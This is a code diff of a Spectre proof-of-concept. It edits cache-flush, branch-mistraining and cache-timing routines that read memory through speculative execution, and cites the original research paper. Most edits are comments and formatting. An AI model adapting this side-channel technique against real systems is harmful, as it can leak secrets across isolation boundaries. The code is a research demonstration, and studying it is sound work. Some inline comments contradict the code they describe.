@@ -1,9 +1,9 @@
-/* spectre-test.c */
-/* Compile with gcc -march=native option */
+/* spectre-test.c
+ * https://paulkocher.com/doc/Spectre-Attacks_Exploiting-Speculative-Execution.pdf
+ * Compile with gcc -march=native option */
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdint.h>
-
 #ifdef _MSC_VER
 #include <intrin.h>         /* For rdtscp and clflush */
 #pragma optimize("gt", on)
@@ -11,6 +11,7 @@
 #include <x86intrin.h>      /* For rdtscp and clflush */
 #endif
 
+/* Victim code */
 unsigned int array1_size = 16;
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t array2[256 * 512];  /* 131072 */
@@ -27,6 +28,7 @@ void victim_function(size_t x) {
     }
 }
 
+/* Analysis code */
 #define CACHE_HIT_THRESHOLD (80) /* Assume cache hit if time <= threshold  */
 
 /* Report best guess in value[0] and runner-up in value[1] */
@@ -42,7 +44,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         results[i] = 0;
     }
 
-    for (attempts = 999; attempts >= 0; attempts--) {
+    for (attempts = 999; attempts > 0; attempts--) {
         /* Flush array2[256 * (0..256)] from cache */
         for (i = 0; i < 256; i++) {
             _mm_clflush(&array2[i * 512]);
@@ -52,7 +54,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         training_x = attempts % array1_size;
         for (j = 29; j >= 0; j--) {
             _mm_clflush(&array1_size);
-            for (volatile int z = 0; z < 100; z++) {}   /* Can also mfence */
+            for (volatile int z = 0; z < 100; z++) { }  /* Can also mfence */
+            
             x = ((j % 6) - 1) & ~0xFFFF;                /* if j % 0x110 == 0 then x = FFF.FF000 else x = 0 */
             x = (x | (x >> 16));                        /* If j & 0x110 == 0 then x = -1 else x = 0 */
             x = training_x ^ (x & (malicious_x ^ training_x));
@@ -84,7 +87,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
             }
         }
         if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
-            break;
+            break;          /* Success if best greater than 2*runner-up + 5 or 2/0 */
         }
         results[0] ^= junk; /* Use junk to prevent optimization */
         value[0] = (uint8_t)j;
